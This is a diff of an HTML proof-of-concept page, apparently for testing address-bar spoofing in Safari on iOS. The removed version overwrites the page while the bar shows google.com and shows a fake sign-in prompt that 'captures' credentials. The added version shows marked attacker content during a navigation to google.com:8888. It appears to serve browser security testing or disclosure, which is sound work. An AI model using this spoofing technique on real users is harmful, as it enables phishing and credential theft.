@@ -1,77 +1,106 @@
 <!DOCTYPE html>
+
 <html lang="en">
+
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Spoofing PoC</title>
-  <style>
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      margin: 0;
-      font-family: sans-serif;
-      background-color: #f9f9f9;
-    }
-    .container {
-      text-align: center;
-      padding: 20px;
-    }
-    button {
-      padding: 12px 24px;
-      font-size: 18px;
-      cursor: pointer;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Safari iOS Address Bar Test</title>
+
+    <style>
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #f5f5f5;
+        }
+
+        .container {
+            text-align: center;
+            padding: 30px;
+        }
+
+        button {
+            padding: 14px 28px;
+            font-size: 18px;
+            border: 0;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+
+        #marker {
+            margin-top: 20px;
+            padding: 15px;
+            background: #fff;
+            border-radius: 8px;
+            border: 2px solid red;
+        }
+    </style>
+
 </head>
+
 <body>
 
-  <div class="container" id="main">
-    <button onclick="executeSpoof()">Start Test</button>
-  </div>
+    <div class="container" id="app">
 
-  <script>
-    function executeSpoof() {
-      // 1. Eksekusi navigasi ke target domain pada frame utama
-      let win = window.open('https://www.google.com/about/', '_self');
+        <h2>Safari iOS Address-Bar Test</h2>
 
-      // 2. Tembakkan penulisan ulang dokumen sebelum context teardown selesai di WebKit
-      setTimeout(() => {
-        try {
-          // Hentikan proses pemuatan halaman asli Google
-          window.stop();
+        <button id="start">
+            Start Test
+        </button>
 
-          // Timpa seluruh isi dokumen dengan konten buatan penyerang
-          document.open();
-          document.write(`
-            <!DOCTYPE html>
-            <html>
-            <head><title>Spoofed Page</title></head>
-            <body style="display:flex; justify-content:center; align-items:center; min-height:100vh; margin:0; font-family:sans-serif; background-color:#fff;">
-              <div style="text-align:center; padding:20px;">
-                <h1 style="color: red; font-size: 28px;">This is not Google.</h1>
-                <p style="color: #333;">This custom HTML is rendered while the address bar displays google.com.</p>
-              </div>
-            </body>
-            </html>
-          `);
-          document.close();
+        <div id="marker">
+            ATTACKER-CONTROLLED CONTENT
+        </div>
 
-          // 3. Picu prompt opsional di atas halaman palsu tersebut
-          setTimeout(() => {
-            let user = prompt('Sign into your account in order to access www.google.com', 'E-mail / Password');
-            if (user) {
-              alert('Captured Credentials: ' + user);
-            }
-          }, 100);
+    </div>
 
-        } catch (e) {
-          console.warn("Cross-origin or frame access blocked:", e);
-        }
-      }, 0); // Jeda 0ms-20ms untuk mengeksploitasi pemicuan event loop WebKit
-    }
-  </script>
+    <script>
+        document.getElementById("start").addEventListener("click", () => {
+
+            /*
+             * Make the origin-controlled content unmistakable.
+             */
+            document.getElementById("app").innerHTML = `
+    <h1 style="color:red;">
+      ADDRESS BAR TEST
+    </h1>
+
+    <div style="
+      padding:20px;
+      border:3px solid red;
+      background:white;
+    ">
+      <strong>ATTACKER-CONTROLLED CONTENT</strong>
+      <br><br>
+      Expected origin:
+      <br>
+      <code>k4tedu.github.io</code>
+
+      <br><br>
+
+      This page must NOT be confused with Google.
+    </div>
+  `;
+
+            /*
+             * Start top-level navigation.
+             *
+             * Port 8888 is intentionally used as the test
+             * destination.
+             */
+            const target = "https://google.com:8888";
+
+            setTimeout(() => {
+                window.location.href = target;
+            }, 50);
+
+        });
+    </script>
 
 </body>
+
 </html>
